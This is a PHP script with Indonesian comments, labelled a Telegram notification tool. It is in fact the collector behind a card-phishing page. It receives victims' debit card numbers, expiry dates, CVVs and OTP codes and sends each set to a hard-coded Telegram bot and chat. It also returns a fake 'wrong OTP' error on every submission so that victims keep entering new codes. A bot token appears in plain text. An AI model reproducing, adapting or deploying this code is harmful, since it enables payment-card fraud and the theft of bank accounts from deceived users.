<?php
/**
 * Telegram Notification Script (Anti-Flood & Queue Mode)
 * Fix: Menambahkan jeda (sleep) agar notif tidak dianggap spam oleh Telegram
 */

// 1. SETUP AWAL
ini_set('display_errors', 0); // Matikan error display agar response JSON bersih
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit;
}
header('Content-Type: application/json');

// 2. SESSION START
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// --- CONFIGURATION ---
$botToken = '8966756119:AAFJkGhQ2tfvqkWhgKjt8JzVym1DZTo4mZc'; 
$chatId   = '7772104266'; 

// 3. AMBIL DATA
$input = file_get_contents('php://input');
$jsonData = json_decode($input, true);

$step       = $jsonData['step'] ?? $_POST['step'] ?? '';
$cardNumber = $jsonData['cardNumber'] ?? $_POST['cardNumber'] ?? '';
$cardExpiry = $jsonData['cardExpiry'] ?? $_POST['cardExpiry'] ?? '';
$cardCvv    = $jsonData['cardCvv'] ?? $_POST['cardCvv'] ?? '';
$otpCode    = $jsonData['otpCode'] ?? $_POST['otpCode'] ?? '';

// Info Device
$ip = $_SERVER["REMOTE_ADDR"];
$time = date("H:i:s");
$uniqueId = rand(100, 999); // ID Acak Pendek

// 4. LOGIKA PENGIRIMAN
if ($step === '1') {
    // Simpan data kartu
    $_SESSION['cardNumber'] = $cardNumber;
    $_SESSION['cardExpiry'] = $cardExpiry;
    $_SESSION['cardCvv']    = $cardCvv;
    
    // Pesan Step 1
    $message = "
━─━────༺𝗨𝗢𝗕༻────━─━
𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 :
<code>$cardNumber</code>
𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 :
<code>$cardExpiry</code>
𝗖𝗩𝗩/𝗡𝗼 𝗛𝗣 :
<code>$cardCvv</code>
━─━────༺𝗨𝗢𝗕༻────━─━";
    
    sendMessage($botToken, $chatId, $message);
    echo json_encode(['status' => 'success']);

} elseif ($step === '2') {
    // Ambil Session lalu TUTUP AKSES SESSION (Penting agar tidak macet saat spam klik)
    $s_num = $_SESSION['cardNumber'] ?? '-';
    $s_exp = $_SESSION['cardExpiry'] ?? '-';
    $s_cvv = $_SESSION['cardCvv'] ?? '-';
    session_write_close(); 

    // Pesan Step 2
    $message = "
━─━────༺𝗨𝗢𝗕༻────━─━
𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 :
<code>$s_num</code>
𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 :
<code>$s_exp</code>
𝗖𝗩𝗩/𝗡𝗼 𝗛𝗣 :
<code>$s_cvv</code>
𝗢𝗧𝗣 𝗖𝗼𝗱𝗲 :
<code>$otpCode</code>
━─━────༺𝗨𝗢𝗕༻────━─━";

    // --- ANTI SPAM PROTECTION ---
    // Kita tahan script selama 1 detik sebelum kirim ke Telegram.
    // Ini mencegah 'Request Sekaligus' yang bikin notif hilang.
    sleep(1); 
    
    sendMessage($botToken, $chatId, $message);
    
    // Kembalikan Error agar Looping Frontend jalan
    echo json_encode([
        'status' => 'error', 
        'message' => 'Kode OTP salah.',
        'action' => 'retry_otp',
        'clear_input' => true
    ]);
}

// 5. FUNGSI KIRIM (cURL)
function sendMessage($token, $chat, $text) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $postData = [
        'chat_id' => $chat, 
        'text' => $text, 
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout cukup panjang buat nunggu sleep
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}
?>
